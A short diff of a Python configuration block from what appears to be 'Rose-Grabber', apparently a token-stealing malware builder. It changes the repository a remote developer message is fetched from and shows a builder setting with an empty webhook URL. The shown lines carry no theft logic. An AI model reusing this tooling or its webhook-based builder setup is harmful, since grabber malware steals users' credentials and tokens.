@@ -42,7 +42,7 @@ __avatar__ = 'https://cdn.discordapp.com/attachments/1155214110364008548/1155214
 __version__ = '1.9'
 __debugm__ = False # Change only if you are a dev 
 __icon__ = "https://cdn.discordapp.com/attachments/1155214110364008548/1155214244564971583/8eb9b9fc-283e-42f1-9b08-26c7fa00dc09.jpg"
-__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
+__devmsg__ = requests.get("https://raw.githubusercontent.com/awijriawfdawd/xxx/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
 
 data_builder = {
     "webhook_url": "",
